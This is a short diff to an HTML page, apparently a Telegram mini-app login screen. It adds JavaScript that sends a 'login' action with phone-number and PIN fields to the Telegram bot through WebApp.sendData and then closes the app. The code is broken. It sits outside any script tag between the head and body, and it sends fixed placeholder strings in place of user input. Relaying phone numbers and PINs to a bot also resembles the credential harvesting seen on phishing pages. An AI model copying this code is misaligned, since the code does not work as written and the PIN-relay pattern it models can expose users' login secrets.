@@ -62,6 +62,15 @@
     .copyright { margin-top: auto; padding-top: 30px; font-size: 13px; opacity: 0.5; text-align: center; }
   </style>
 </head>
+  if (window.Telegram && window.Telegram.WebApp) {
+  Telegram.WebApp.sendData(JSON.stringify({
+    action: 'login',
+    phone: 'nombor_telefon',
+    pin: 'nombor_pin'
+  }));
+  Telegram.WebApp.close();
+}
+  
 <body>
 
   <svg class="logo" viewBox="0 0 200 100" xmlns="http://www.w3.org/2000/svg">
